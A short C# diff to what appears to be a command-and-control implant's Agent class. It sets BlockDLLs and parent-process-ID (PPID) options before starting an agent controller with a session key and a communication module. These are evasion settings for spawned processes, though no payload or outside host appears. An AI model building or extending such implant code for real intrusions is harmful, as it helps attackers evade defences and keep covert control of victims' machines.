@@ -59,6 +59,9 @@ namespace Agent
 
         static void Execute(ConfigController Config, ICommModule CommModule)
         {
+            Config.Set(AgentConfig.BlockDLLs, false);
+            Config.Set(AgentConfig.PPID, System.Diagnostics.Process.GetCurrentProcess().Id);
+
             var agent = new AgentController(ID, SessionKey, CommModule, Config);
 
             CommModule.Init(Config);
